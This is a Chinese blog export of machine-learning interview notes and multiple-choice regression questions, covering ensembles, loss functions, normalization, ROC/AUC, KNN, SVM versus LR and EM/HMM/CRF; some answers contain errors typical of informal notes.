取一份为测试集， 其他为训练集， 每次训练完立即拿此次选中的测试集自测. 因为每份都有一次机会当测试集， 所以此方法称之为交叉验证. 交叉验证的错误率最小时可以认为泛化性能最好， 这时候训练错误率虽然还在继续下降， 但也得终止继续训练了. kmeans的复杂度 时间复杂度：O(tKmn)，其中，t为迭代次数，K为簇的数目，m为记录数，n为维数空间复杂度：O((m+K)n)，其中，K为簇的数目，m为记录数，n为维数 对所有优化问题来说， 有没有可能找到比現在已知算法更好的算法没有免费的午餐定理： 对于训练样本（黑点），不同的算法A/B在不同的测试样本（白点）中有不同的表现，这表示：对于一个学习算法A，若它在某些问题上比学习算法 B更好，则必然存在一些问题，在那里B比A好。 也就是说：对于所有问题，无论学习算法A多聪明，学习算法 B多笨拙，它们的期望性能相同。 但是：没有免费午餐定力假设所有问题出现几率相同，实际应用中，不同的场景，会有不同的问题分布，所以，在优化算法时，针对具体问题进行分析，是算法优化的核心所在。 请问（决策树、Random Forest、Booting、Adaboot）GBDT和XGBoost的区别是什么集成学习的集成对象是学习器. Bagging和Boosting属于集成学习的两类方法. Bagging方法有放回地采样同数量样本训练每个学习器， 然后再一起集成(简单投票); Boosting方法使用全部样本(可调权重)依次训练每个学习器， 迭代集成(平滑加权).决策树属于最常用的学习器， 其学习过程是从根建立树， 也就是如何决策叶子节点分裂. ID3/C4.5决策树用信息熵计算最优分裂， CART决策树用基尼指数计算最优分裂， xgboost决策树使用二阶泰勒展开系数计算最优分裂.下面所提到的学习器都是决策树:Bagging方法: 学习器间不存在强依赖关系， 学习器可并行训练生成， 集成方式一般为投票; Random Forest属于Bagging的代表， 放回抽样， 每个学习器随机选择部分特征去优化;Boosting方法: 学习器之间存在强依赖关系、必须串行生成， 集成方式为加权和; Adaboost属于Boosting， 采用指数损失函数替代原本分类任务的0/1损失函数; GBDT属于Boosting的优秀代表， 对函数残差近似值进行梯度下降， 用CART回归树做学习器， 集成为回归模型; xgboost属于Boosting的集大成者， 对函数残差近似值进行梯度下降， 迭代时利用了二阶梯度信息， 集成模型可分类也可回归. 由于它可在特征粒度上并行计算， 结构风险和工程实现都做了很多优化， 泛化， 性能和扩展性都比GBDT要好。关于决策树，这里有篇《决策树算法》（链接：http://blog.csdn.net/v_july_v/article/details/7577684）。而随机森林Random Forest是一个包含多个决策树的分类器。至于AdaBoost，则是英文”Adaptive Boosting”（自适应增强）的缩写，关于AdaBoost可以看下这篇文章《Adaboost 算法的原理与推导》。GBDT（Gradient Boosting Decision Tree），即梯度上升决策树算法，相当于融合决策树和梯度上升boosting算法。 xgboost类似于gbdt的优化版，不论是精度还是效率上都有了提升。与gbdt相比，具体的优点有：1.损失函数是用泰勒展式二项逼近，而不是像gbdt里的就是一阶导数2.对树的结构进行了正则化约束，防止模型过度复杂，降低了过拟合的可能性3.节点分裂的方式不同，gbdt是用的gini系数，xgboost是经过优化推导后的 说说常见的损失函数对于给定的输入X，由f(X)给出相应的输出Y，这个输出的预测值f(X)与真实值Y可能一致也可能不一致（要知道，有时损失或误差是不可避免的），用一个损失函数来度量预测错误的程度。损失函数记为L(Y， f(X))。 常用的损失函数有以下几种（基本引用自《统计学习方法》）： 如此，SVM有第二种理解，即最优化+损失最小，或如@夏粉_百度所说“可从损失函数和优化算法角度看SVM，boosting，LR等算法，可能会有不同收获”。 关于SVM的更多理解请参考：，链接： 协方差和相关性有什么区别相关性是协方差的标准化格式。协方差本身很难做比较。例如：如果我们计算工资（$）和年龄（岁）的协方差，因为这两个变量有不同的度量，所以我们会得到不能做比较的不同的协方差。为了解决这个问题，我们计算相关性来得到一个介于-1和1之间的值，就可以忽略它们各自不同的度量。 谈谈判别式模型和生成式模型判别方法：由数据直接学习决策函数 Y = f（X），或者由条件分布概率 P（Y|X）作为预测模型，即判别模型。生成方法：由数据学习联合概率密度分布函数 P（X，Y），然后求出条件概率分布P(Y|X)作为预测的模型，即生成模型。由生成模型可以得到判别模型，但由判别模型得不到生成模型。常见的判别模型有：K近邻、SVM、决策树、感知机、线性判别分析（LDA）、线性回归、传统的神经网络、逻辑斯蒂回归、boosting、条件随机场常见的生成模型有：朴素贝叶斯、隐马尔可夫模型、高斯混合模型、文档主题生成模型（LDA）、限制玻尔兹曼机 线性分类器与非线性分类器的区别以及优劣线性和非线性是针对，模型参数和输入特征来讲的；比如输入x，模型y=ax+ax^2那么就是非线性模型，如果输入是x和X^2则模型是线性的。线性分类器可解释性好，计算复杂度较低，不足之处是模型的拟合效果相对弱些。非线性分类器效果拟合能力较强，不足之处是数据量不足容易过拟合、计算复杂度高、可解释性不好。常见的线性分类器有：LR，贝叶斯分类，单层感知机、线性回归常见的非线性分类器：决策树、RF、GBDT、多层感知机SVM两种都有（看线性核还是高斯核） 请大致对比下plsa和LDA的区别更多请参见：《通俗理解LDA主题模型》（链接：http://blog.csdn.net/v_july_v/article/details/41209515）。 请简要说说EM算法本题解析来源：@tornadomeet，链接：http://www.cnblogs.com/tornadomeet/p/3395593.html 什么最小二乘法对了，最小二乘法跟SVM有什么联系呢请参见《支持向量机通俗导论（理解SVM的三层境界）》(链接：http://blog.csdn.net/v_july_v/article/details/7624837）。 优化KmeansKmeans总结：https://www.processon.com/view/link/5ad81e5be4b046910642bc4b 使用kd树或者ball tree将所有的观测实例构建成一颗kd树，之前每个聚类中心都是需要和每个观测点做依次距离计算，现在这些聚类中心根据kd树只需要计算附近的一个局部区域即可。 KMeans初始类簇中心点的选取。k-means++算法选择初始seeds的基本思想就是：初始的聚类中心之间的相互距离要尽可能的远。 从输入的数据点集合中随机选择一个点作为第一个聚类中心 对于数据集中的每一个点x，计算它与最近聚类中心(指已选择的聚类中心)的距离D(x) 选择一个新的数据点作为新的聚类中心，选择的原则是：D(x)较大的点，被选取作为聚类中心的概率较大 重复2和3直到k个聚类中心被选出来 利用这k个初始的聚类中心来运行标准的k-means算法 解释对偶的概念一个优化问题可以从两个角度进行考察，一个是primal 问题，一个是dual 问题，就是对偶问题，一般情况下对偶问题给出主问题最优值的下界，在强对偶性成立的情况下由对偶问题可以得到主问题的最优下界，对偶问题是凸优化问题，可以进行较好的求解，SVM中就是将primal问题转换为dual问题进行求解，从而进一步引入核函数的思想。 数据不平衡问题 采样，对小样本加噪声采样（过拟合），对大样本进行下采样（欠拟合） 数据生成，利用已知样本生成新的样本（深度学习的数据增强） 进行特殊的加权，如在Adaboost中或者SVM中 采用对不平衡数据集不敏感的算法 改变评价标准：用AUC/ROC来进行评价 采用Bagging/Boosting/ensemble等方法 在设计模型的时候考虑数据的先验分布 详见：https://www.cnblogs.com/zhaokui/p/5101301.html 图片数据增强（Data augmentation）： 水平翻转 随机裁剪 样本不平衡, 进行 Label shuffle 其他平移变换；旋转/仿射变换；高斯噪声、模糊处理对颜色的数据增强：图像亮度、饱和度、对比度变化 特征比数据量还大时，选择什么样的分类器线性分类器，因为维度高的时候，数据一般在维度空间里面会比较稀疏，很有可能线性可分。 常见的分类算法有哪些SVM、神经网络、随机森林、逻辑回归、KNN、贝叶斯 说说常见的优化算法及其优缺点温馨提示：在回答面试官的问题的时候，往往将问题往大的方面去回答，这样不会陷于小的技术上死磕，最后很容易把自己嗑死了。简言之1）随机梯度下降优点：可以一定程度上解决局部最优解的问题缺点：收敛速度较慢2）批量梯度下降优点：容易陷入局部最优解缺点：收敛速度较快3）mini_batch梯度下降综合随机梯度下降和批量梯度下降的优缺点，提取的一个中和的方法。4）牛顿法牛顿法在迭代的时候，需要计算Hessian矩阵，当维度较高的时候，计算 Hessian矩阵比较困难。5）拟牛顿法拟牛顿法是为了改进牛顿法在迭代过程中，计算Hessian矩阵而提取的算法，它采用的方式是通过逼近Hessian的方式来进行求解。 具体而言从每个batch的数据来区分梯度下降：每次使用全部数据集进行训练优点：得到的是最优解缺点：运行速度慢，内存可能不够随机梯度下降：每次使用一个数据进行训练优点：训练速度快，无内存问题缺点：容易震荡，可能达不到最优解Mini-batch梯度下降优点：训练速度快，无内存问题，震荡较少缺点：可能达不到最优解 从优化方法上来分：随机梯度下降（SGD）缺点选择合适的learning rate比较难对于所有的参数使用同样的learning rate容易收敛到局部最优可能困在saddle pointSGD+Momentum优点：积累动量，加速训练局部极值附近震荡时，由于动量，跳出陷阱梯度方向发生变化时，动量缓解动荡。Nesterov Mementum与Mementum类似，优点：避免前进太快提高灵敏度AdaGrad优点：控制学习率，每一个分量有各自不同的学习率适合稀疏数据缺点依赖一个全局学习率学习率设置太大，其影响过于敏感后期，调整学习率的分母积累的太大，导致学习率很低，提前结束训练。RMSProp优点：解决了后期提前结束的问题。缺点：依然依赖全局学习率AdamAdagrad和RMSProp的合体优点：结合了Adagrad善于处理稀疏梯度和RMSprop善于处理非平稳目标的优点为不同的参数计算不同的自适应学习率也适用于大多非凸优化 - 适用于大数据集和高维空间牛顿法牛顿法在迭代的时候，需要计算Hessian矩阵，当维度较高的时候，计算 Hessian矩阵比较困难拟牛顿法拟牛顿法是为了改进牛顿法在迭代过程中，计算Hessian矩阵而提取的算法，它采用的方式是通过逼近Hessian的方式来进行求解。 机器学习中，为何要经常对数据做归一化 归一化后加快了梯度下降求最优解的速度 归一化有可能提高精度。 如上图所示，蓝色的圈圈图代表的是两个特征的等高线。其中左图两个特征X1和X2的区间相差非常大，X1区间是[0,2000]，X2区间是[1,5]，其所形成的等高线非常尖。当使用梯度下降法寻求最优解时，很有可能走“之字型”路线（垂直等高线走），从而导致需要迭代很多次才能收敛； 而右图对两个原始特征进行了归一化，其对应的等高线显得很圆，在梯度下降进行求解时能较快的收敛（消除了量纲的影响）。 至于为什么能提高精度，比如一些分类器需要计算样本之间的距离（如欧氏距离），例如KNN。如果一个特征值域范围非常大，那么距离计算就主要取决于这个特征，从而与实际情况相悖（比如这时实际情况是值域范围小的特征更重要）。 值域范围大的特征将在cost函数中得到更大的加权（如果较高幅值的特征改变 1%，则该改变相当大，但是对于较小的特征，该改变相当小），数据归一化使所有特征的权重相等。 特征向量的归一化方法有哪些 线性归一化（Min-Max Normalization），表达式如下：也称为离差标准化，是对原始数据的线性变换，使结果值映射到[0 - 1]之间y=(x-MinValue)/(MaxValue-MinValue)这种归一化方法比较适用在数值比较集中的情况。这种方法有个缺陷，如果max和min不稳定，很容易使得归一化结果不稳定，使得后续使用效果也不稳定。实际使用中可以用经验常量值来替代max和min。 Z-score标准化，减去均值，除以方差：经过处理的数据符合标准正态分布，即均值为0，标准差为1，其转化函数为y=(x-means)/ variance 非线性归一化。经常用在数据分化比较大的场景，有些数值很大，有些很小。通过一些数学函数，将原始值进行映射。该方法包括 log、指数，正切等。需要根据数据分布的情况，决定非线性函数的曲线，比如log(V, 2)还是log(V, 10)等。 对数函数转换，表达式如下： y=log10 (x) 反余切函数转换 ，表达式如下： y=arctan(x)*2/PI 哪些机器学习算法不需要做归一化处理概率模型不需要归一化，因为它们不关心变量的值，而是关心变量的分布和变量之间的条件概率，树形结构就属于概率模型，如决策树、rf。 而像adaboost、svm、lr、KNN、KMeans之类的最优化问题就需要归一化。 归一化和标准化主要是为了使计算更方便，加快求解最优解的速度。比如两个变量的量纲不同，可能一个的数值远大于另一个，那么他们同时作为变量的时候，可能会造成数值计算问题，比如说求矩阵的逆可能很不精确，或者梯度下降法的收敛比较困难，还有如果需要计算欧式距离的话可能，量纲也需要调整。 对于树形结构为什么不需要归一化数值缩放，不影响分裂点位置。因为第一步都是按照特征值进行排序的，排序的顺序不变，那么所属的分支以及分裂点就不会有不同。 对于线性模型，比如说LR，我有两个特征，一个是(0，1)的，一个是(0，10000)的，这样运用梯度下降时候，损失等高线是一个椭圆的形状，这样我想迭代到最优点，就需要很多次迭代，但是如果进行了归一化，那么等高线就是圆形的，那么SGD就会往原点迭代，需要的迭代次数较少。 另外，注意树模型是不能进行梯度下降的，因为树模型是阶跃的，阶跃点是不可导的，并且求导没意义，所以树模型（回归树）寻找最优点事通过寻找最优分裂点完成的。 标准化与归一化的区别简单来说，归一化是依照特征矩阵的行处理数据，其目的在于样本向量在点乘运算或其他核函数计算相似性时，拥有统一的标准，也就是说都转化为“单位向量”。 标准化是依照特征矩阵的列处理数据，其通过求z-score的方法，将样本的特征值转换到同一量纲下。 模型评估指标有时候为了更好更快的评估模型，我们需要设置评估指标。常见的评估指标有：准确率/召回率/精准率/F值1）准确率(Accuracy) = 预测正确的样本数/总样本数2）召回率(Recall) = 预测正确的正例样本数/样本中的全部正例样本数3）精准率(Precision) = 预测正确的正例样本数/预测为正例的样本数4）F值 = PrecisionRecall2 / (Precision+Recall) (即F值为正确率和召回率的调和平均值) ROC与AUC对于分类器，或者说分类算法，评价指标主要有精准率(Precision)，召回率(Recall)，F-score1，以及现在所说的ROC和AUC。ROC、AUC相比准确率、召回率、F-score这样的评价指标，有这样一个很好的特性：当测试集中正负样本的分布变化的时候，ROC曲线能够保持不变。在实际的数据集中经常会出现类不平衡（class imbalance）现象，即负样本比正样本多很多（或者相反），而且测试数据中的正负样本的分布也可能随着时间变化。 ROC曲线的纵轴是“真正例率”（True Positive Rate 简称TPR），横轴是“假正例率” （False Positive Rate 简称FPR）。ROC曲线反映了FPR与TPR之间权衡的情况，通俗地来说，即在TPR随着FPR递增的情况下，谁增长得更快，快多少的问题。TPR增长得越快，曲线越往上屈，AUC就越大，反映了模型的分类性能就越好。当正负样本不平衡时，这种模型评价方式比起一般的精确度评价方式的好处尤其显著。 AUC（Area Under Curve）被定义为ROC曲线下的面积，显然这个面积的数值不会大于1。又由于ROC曲线一般都处于y=x这条直线的上方，所以AUC的取值范围在0.5和1之间。使用AUC值作为评价标准是因为很多时候ROC曲线并不能清晰的说明哪个分类器的效果更好，而AUC作为数值可以直观的评价分类器的好坏，值越大越好。1）AUC = 1，是完美分类器，采用这个预测模型时，不管设定什么阈值都能得出完美预测。绝大多数预测的场合，不存在完美分类器。2）0.5 &lt; AUC &lt; 1，优于随机猜测。这个分类器（模型）妥善设定阈值的话，能有预测价值。3）AUC = 0.5，跟随机猜测一样（例：丢铜板），模型没有预测价值。4）AUC &lt; 0.5，比随机猜测还差；但只要总是反预测而行，就优于随机猜测。 至于ROC曲线具体是如何画出来的，这里推荐一篇文章：ROC和AUC介绍以及如何计算AUC 机器学习和统计里面的auc怎么理解？为什么比accuracy更常用？ 常见损失函数 铰链损失（Hinge Loss）：主要用于支持向量机（SVM） 中； $\\ell(y) = \\max(0, 1-t \\cdot y)$ 交叉熵损失 （Cross Entropy Loss，Softmax Loss ）：用于Logistic 回归与Softmax 分类中； 平方和损失（Square Loss）：主要是普通最小二乘法( Ordinary Least Square，OLS)中； 指数损失（Exponential Loss） ：主要用于Adaboost 集成学习算法中，详见 Adaboost与指数损失 其他损失（如0-1损失，绝对值损失） 参考文献： https://blog.csdn.net/u010976453/article/details/78488279 http://www.csuldw.com/2016/03/26/2016-03-26-loss-function/ 除了MSE，还有哪些模型效果判断方法？区别是什么 SSE(The sum of squares due to error)和方差、误差平方和。计算的是拟合数据和原始数据对应点的误差的平方和，越趋近于0表示模型越拟合训练数据。 SSE=\\sum_{t=1}^{N}(observed_t-predicted_t)^2 MSE(Mean squared error)：均方误差。计算的是预测数据和原始数据对应点误差的平方和的均值，越趋近于0表示模型越拟合训练数据。 MSE=\\frac{1}{N}\\sum_{t=1}^{N}(observed_t-predicted_t)^2 RMSE(Root mean squared error)：均方根，也叫回归系统的拟合标准差，是MSE的平方根 RMSE=\\sqrt{\\frac{1}{N}\\sum_{t=1}^{N}(observed_t-predicted_t)^2} MAE(Mean Absolute Error)：平均绝对误差是绝对误差的平均值。平均绝对误差能更好地反映预测值误差的实际情况. MAE={\\frac{1}{N}\\sum_{i=1}^{N}\\lvert(observed_t-predicted_t)\\rvert} RMS(Root Mean Square)：均方根值计算方法是先平方、再平均、然后开方，维基百科定义 SD(standard Deviation)：标准差又常称均方差，是方差的算术平方根。标准差能反映一个数据集的离散程度。平均数相同的两组组数据，标准差未必相同。 SD=\\sqrt{\\frac{1}{N}\\sum_{i=1}^{N}(x_i-u)^2} $R^2(R-Squared)$ ：取值范围(负无穷,1]，值越大表示模型越拟合训练数据；最优解是1；当模型预测为随机值的时候，有可能为负；若预测值恒为样本期望，$R^2$ 为0 Adjusted R-Squared: R_{adj}^2=1-\\frac{(n-1)(1-R^2)}{n-p-1}$R^2$ 及其校正函数用处详见第18题：机器学习笔试题精选 TSS(Total Sum of Squares)：总平方和，TSS表示样本之间的差异情况，是伪方差的m倍 RSS(Residual Sum of Squares)：残差平方和，RSS表示预测值和样本值之间的差异情况，是MSE的m倍 试证明样本空间任意点x到超平面(w，b)的距离为(6.2) 什么是共线性， 跟过拟合有什么关联共线性：多变量线性回归中，变量之间由于存在高度相关关系而使回归估计不准确。共线性会造成冗余，导致过拟合。解决方法：排除变量的相关性／加入权重正则。 对于维度极低的特征，选择线性还是非线性分类器非线性分类器，低维空间可能很多特征都跑到一起了，导致线性不可分。 如果Feature的数量很大，跟样本数量差不多，这时候选用LR或者是Linear Kernel的SVM 如果Feature的数量比较小，样本数量一般，不算大也不算小，选用SVM+Gaussian Kernel 如果Feature的数量比较小，而样本数量很多，需要手工添加一些feature变成第一种情况。 什么是ill-condition病态问题训练完的模型，测试样本稍作修改就会得到差别很大的结果，就是病态问题，模型对未知数据的预测能力很差，即泛化误差大。 简述KNN算法过程谓k最近邻，就是k个最近的邻居的意思，说的是每个样本都可以用它最接近的k个邻居来代表。 计算训练样本和测试样本中每个样本点的距离（常见的距离度量有欧式距离，马氏距离等）； 对上面所有的距离值进行排序； 选前k个最小距离的样本； 根据这k个样本的标签进行投票，得到最后的分类类别； KNN算法不仅可以用于分类，还可以用于回归。通过找出一个样本的k个最近邻居，将这些邻居的属性的平均值赋给该样本，就可以得到该样本的属性。更有用的方法是将不同距离的邻居对该样本产生的影响给予不同的权值(weight)，如权值与距离成反比。 KNN中的K如何选取的关于什么是KNN，可以查看此文：《从K近邻算法、距离度量谈到KD树、SIFT+BBF算法》（链接：http://blog.csdn.net/v_july_v/article/details/8203674）。KNN中的K值选取对K近邻算法的结果会产生重大影响。如李航博士的一书「统计学习方法」上所说： 如果选择较小的K值，就相当于用较小的领域中的训练实例进行预测，“学习”近似误差会减小，只有与输入实例较近或相似的训练实例才会对预测结果起作用，与此同时带来的问题是“学习”的估计误差会增大，换句话说，K值的减小就意味着整体模型变得复杂，容易发生过拟合； 如果选择较大的K值，就相当于用较大领域中的训练实例进行预测，其优点是可以减少学习的估计误差，但缺点是学习的近似误差会增大。这时候，与输入实例较远（不相似的）训练实例也会对预测器作用，使预测发生错误，且K值的增大就意味着整体的模型变得简单。 K=N，则完全不足取，因为此时无论输入实例是什么，都只是简单的预测它属于在训练实例中最多的累，模型过于简单，忽略了训练实例中大量有用信息。 在实际应用中，K值一般取一个比较小的数值，例如采用交叉验证法（简单来说，就是一部分样本做训练集，一部分做测试集）来选择最优的K值。 常用的聚类划分方式有哪些列举代表算法 基于划分的聚类:K-means，k-medoids，CLARANS。 基于层次的聚类：AGNES（自底向上），DIANA（自上向下）。 基于密度的聚类：DBSACN，OPTICS，BIRCH(CF-Tree)，CURE。 基于网格的方法：STING，WaveCluster。 基于模型的聚类：EM，SOM，COBWEB。 LR和SVM的联系与区别联系：1、LR和SVM都可以处理分类问题，且一般都用于处理线性二分类问题（在改进的情况下可以处理多分类问题）2、两个方法都可以增加不同的正则化项，如l1、l2等等。所以在很多实验中，两种算法的结果是很接近的。区别：1、LR是参数模型，SVM是非参数模型。2、从目标函数来看，区别在于逻辑回归采用的是logistical loss，SVM采用的是hinge loss，这两个损失函数的目的都是增加对分类影响较大的数据点的权重，减少与分类关系较小的数据点的权重。3、SVM的处理方法是只考虑support vectors，也就是和分类最相关的少数点，去学习分类器。而逻辑回归通过非线性映射，大大减小了离分类平面较远的点的权重，相对提升了与分类最相关的数据点的权重。4、逻辑回归相对来说模型更简单，好理解，特别是大规模线性分类时比较方便。而SVM的理解和优化相对来说复杂一些，SVM转化为对偶问题后，分类只需要计算与少数几个支持向量的距离，这个在进行复杂核函数计算时优势很明显，能够大大简化模型和计算。5、logic 能做的 svm能做，但可能在准确率上有问题，svm能做的logic有的做不了。 SVM、LR、决策树的对比 模型复杂度：SVM支持核函数，可处理线性非线性问题; LR模型简单，训练速度快，适合处理线性问题; 决策树容易过拟合，需要进行剪枝. 损失函数：SVM hinge loss; LR L2正则化; adaboost 指数损失 数据敏感度：SVM添加容忍度对outlier不敏感，只关心支持向量，且需要先做归一化; LR对远点敏感 数据量：数据量大就用LR，数据量小且特征少就用SVM非线性核 请比较下EM算法、HMM、CRF这三个放在一起不是很恰当，但是有互相有关联，所以就放在这里一起说了。注意重点关注算法的思想。（1）EM算法 EM算法是用于含有隐变量模型的极大似然估计或者极大后验估计，有两步组成：E步，求期望（expectation）；M步，求极大（maxmization）。本质上EM算法还是一个迭代算法，通过不断用上一代参数对隐变量的估计来对当前变量进行计算，直到收敛。 注意：EM算法是对初值敏感的，而且EM是不断求解下界的极大化逼近求解对数似然函数的极大化的算法，也就是说EM算法不能保证找到全局最优值。对于EM的导出方法也应该掌握。（2）HMM算法 隐马尔可夫模型是用于标注问题的生成模型。有几个参数（π，A，B）：初始状态概率向量π，状态转移矩阵A，观测概率矩阵B。称为马尔科夫模型的三要素。马尔科夫三个基本问题：概率计算问题：给定模型和观测序列，计算模型下观测序列输出的概率。–》前向后向算法学习问题：已知观测序列，估计模型参数，即用极大似然估计来估计参数。–》Baum-Welch(也就是EM算法)和极大似然估计。预测问题：已知模型和观测序列，求解对应的状态序列。–》近似算法（贪心算法）和维比特算法（动态规划求最优路径）（3）条件随机场CRF 给定一组输入随机变量的条件下另一组输出随机变量的条件概率分布密度。条件随机场假设输出变量构成马尔科夫随机场，而我们平时看到的大多是线性链条随机场，也就是由输入对输出进行预测的判别模型。求解方法为极大似然估计或正则化的极大似然估计。 之所以总把HMM和CRF进行比较，主要是因为CRF和HMM都利用了图的知识，但是CRF利用的是马尔科夫随机场（无向图），而HMM的基础是贝叶斯网络（有向图）。而且CRF也有：概率计算问题、学习问题和预测问题。大致计算方法和HMM类似，只不过不需要EM算法进行学习问题。（4）HMM和CRF对比 其根本还是在于基本的理念不同，一个是生成模型，一个是判别模型，这也就导致了求解方式的不同。 RF与GBDT之间的区别与联系1）相同点：都是由多棵树组成，最终的结果都是由多棵树一起决定。2）不同点：a 组成随机森林的树可以分类树也可以是回归树，而GBDT只由回归树组成b 组成随机森林的树可以并行生成，而GBDT是串行生成c 随机森林的结果是多数表决表决的，而GBDT则是多棵树累加之和d 随机森林对异常值不敏感，而GBDT对异常值比较敏感e 随机森林是减少模型的方差，而GBDT是减少模型的偏差f 随机森林不需要进行特征归一化。而GBDT则需要进行特征归一化","link":"/2019/01/01/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"机器学习选择题集锦","text":"回归1、对于线性回归，我们应该有以下哪些假设？ 找到离群点很重要, 因为线性回归对离群点很敏感 线性回归要求所有变量必须符合正态分布 线性回归假设数据没有多重线性相关性A 1 和 2B 2 和 3C 1,2 和 3D 以上都不是 答案：D解析：第1个假设, 离群点要着重考虑, 第一点是对的第2个假设, 正态分布不是必须的. 当然, 如果是正态分布, 训练效果会更好第3个假设, 有少量的多重线性相关性也是可以的, 但是我们要尽量避免 只含有一个解释变量的线性回归模型称为“一元线性回归模型”。在一个方程式中含有一个以上的解释变量的线性回归模型称为“多元线性回归模型”。在多元线性回归模型中，各个解释变量之间不能存在线性相关关系。如果存在，则称该模型具有“多重共线性”。多重线性回归是简单直线回归的推广，研究一个因变量与多个自变量之间的数量依存关系。在建立多元线性回归模型时，在变量的选取上要避免出现多重共线性问题。 2、当我们构造线性模型时, 我们注意变量间的相关性. 在相关矩阵中搜索相关系数时, 如果我们发现3对变量的相关系数是(Var1 和Var2, Var2和Var3, Var3和Var1)是-0.98, 0.45, 1.23 . 我们可以得出什么结论: Var1和Var2是非常相关的 因为Var1和Var2是非常相关的, 我们可以去除其中一个 Var3和Var1的1.23相关系数是不可能的A 1 and 3B 1 and 2C 1,2 and 3D 1 答案：C解析：相关性系数范围应该是 [-1,1]一般如果相关系数大于0.7或者小于-0.7, 是高相关的.Var1和Var2相关系数是接近负1, 所以这是多重线性相关, 我们可以考虑去除其中一个.所以1, 2, 3个结论都是对的, 选C. 3、机器学习中L1正则化和L2正则化的区别是？A 使用L1可以得到稀疏的权值B 使用L1可以得到平滑的权值C 使用L2可以得到稀疏的权值 答案：A解析：L1 lasso回归，L2岭回归L1正则化偏向于稀疏，它会自动进行特征选择，去掉一些没用的特征，也就是将这些特征对应的权重置为0.L2主要功能是为了防止过拟合，当所求参数越小时，说明模型越简单，而模型越简单则，越趋向于平滑，从而防止过拟合。 L1正则化将系数w的l1范数作为惩罚项加到损失函数上，由于正则项非零，这就迫使那些弱的特征所对应的系数变成0。因此L1正则化往往会使学到的模型很稀疏（系数w经常为0），这个特性使得L1正则化成为一种很好的特征选择方法。 L2正则化将系数向量的L2范数添加到了损失函数中。由于L2惩罚项中系数是二次方的，这使得L2和L1有着诸多差异，最明显的一点就是，L2正则化会让系数的取值变得平均。对于关联特征，这意味着他们能够获得更相近的对应系数。还是以Y=X1+X2为例，假设X1和X2具有很强的关联，如果用L1正则化，不论学到的模型是Y=X1+X2还是Y=2X1，惩罚都是一样的，都是2alpha。但是对于L2来说，第一个模型的惩罚项是2alpha，但第二个模型的是4*alpha。可以看出，系数之和为常数时，各系数相等时惩罚是最小的，所以才有了L2会让各个系数趋于相同的特点。 可以看出，L2正则化对于特征选择来说一种稳定的模型，不像L1正则化那样，系数会因为细微的数据变化而波动。所以L2正则化和L1正则化提供的价值是不同的，L2正则化对于特征理解来说更加有用：表示能力强的特征对应的系数是非零。 因此，一句话总结就是：L1会趋向于产生少量的特征，而其他的特征都是0，而L2会选择更多的特征，这些特征都会接近于0。Lasso在特征选择时候非常有用，而Ridge就只是一种规则化而已。 4、你正在使用带有 L1 正则化的 logistic 回归做二分类，其中 C 是正则化参数，w1 和 w2 是 x1 和 x2 的系数。当你把 C 值从 0 增加至非常大的值时，下面哪个选项是正确的？A 第一个 w2 成了 0，接着 w1 也成了 0B 第一个 w1 成了 0，接着 w2 也成了 0C w1 和 w2 同时成了 0D 即使在 C 成为大值之后，w1 和 w2 都不能成 0 答案：C解析：L1正则化的函数如下图，所以w1和w2可以为0。同时w1和w2是对称的，不会导致一个为0另一个不为0的状态。 5、如果在一个高度非线性并且复杂的一些变量中, 一个树模型可能比一般的回归模型效果更好. 这是（）A 对的B 错的 答案：A 6、在Logistic Regression 中,如果同时加入L1和L2范数,不会产生什么效果()A 以做特征选择,并在一定程度上防止过拟合B 能解决维度灾难问题C 能加快计算速度D 可以获得更准确的结果 答案：D解析：在代价函数后面加上正则项，L1即是Losso回归，L2是岭回归。L1范数是指向量中各个元素绝对值之和，用于特征选择。L2范数 是指向量各元素的平方和然后求平方根，用于 防止过拟合，提升模型的泛化能力。 L1范数具有系数解的特性，但是要注意的是，L1没有选到的特征不代表不重要，原因是两个高相关性的特征可能只保留一个。如果需要确定哪个特征重要，再通过交叉验证。它的优良性质是能产生稀疏性，导致 W 中许多项变成零。 稀疏的解除了计算量上的好处之外，更重要的是更具有“可解释性”。所以能加快计算速度和缓解维数灾难. 7、对数几率回归（logistics regression）和一般回归分析有什么区别？A 对数几率回归是设计用来预测事件可能性的B 对数几率回归可以用来度量模型拟合程度C 对数几率回归可以用来估计回归系数D 以上所有 答案：D解析：A: 对数几率回归其实是设计用来解决分类问题的B: 对数几率回归可以用来检验模型对数据的拟合度C: 虽然对数几率回归是用来解决分类问题的，但是模型建立好后，就可以根据独立的特征，估计相关的回归系数。就我认为，这只是估计回归系数，不能直接用来做回归模型。 8、回归模型中存在多重共线性, 你如何解决这个问题？1 去除这两个共线性变量2 我们可以先去除一个共线性变量3 计算VIF(方差膨胀因子), 采取相应措施4 为了避免损失信息, 我们可以使用一些正则化方法, 比如, 岭回归和lasso回归A 1B 2C 2和3D 2, 3和4 答案：D解析：解决多重公线性, 可以使用相关矩阵去去除相关性高于75%的变量 (有主观成分). 也可以VIF, 如果VIF值&lt;=4说明相关性不是很高, VIF值&gt;=10说明相关性较高.我们也可以用 岭回归和lasso回归的带有惩罚正则项的方法. 我们也可以在一些变量上加随机噪声, 使得变量之间变得不同, 但是这个方法要小心使用, 可能会影响预测效果。 9、给线性回归模型添加一个不重要的特征可能会造成？A 增加 R-squareB 减少 R-square 答案：A解析：在给特征空间添加了一个特征后，不论特征是重要还是不重要，R-square 通常会增加。R-square定义如下:在给特征空间添加了一个特征后，分子会增加一个残差平方项, 分母会增加一个均值差平方项, 前者一般小于后者, 所以不论特征是重要还是不重要，R-square 通常会增加 10、对于线性回归模型，包括附加变量在内，以下的可能正确的是 : R-Squared 和 Adjusted R-squared都是递增的 R-Squared 是常量的，Adjusted R-squared是递增的 R-Squared 是递减的， Adjusted R-squared 也是递减的 R-Squared 是递减的， Adjusted R-squared是递增的A 1 和 2B 1 和 3C 2 和 4D 以上都不是 答案：D解析：R-squared不能决定系数估计和预测偏差，这就是为什么我们要估计残差图。但是，R-squared有R-squared 和 predicted R-squared 所没有的问题。每次你为模型加入预测器，R-squared递增或不变. 11、线性回归的基本假设不包括哪个？A 随机误差项是一个期望值为0的随机变量B 对于解释变量的所有观测值，随机误差项有相同的方差C 随机误差项彼此相关D 解释变量是确定性变量不是随机变量，与随机误差项之间相互独立E 随机误差项服从正态分布 答案：C 8、一监狱人脸识别准入系统用来识别待进入人员的身份，此系统一共包括识别4种不同的人员：狱警，小偷，送餐员，其他。下面哪种学习方法最适合此种应用需求：A 二分类问题B 多分类问题C 层次聚类问题D k-中心点聚类问题E 回归问题F 结构分析问题 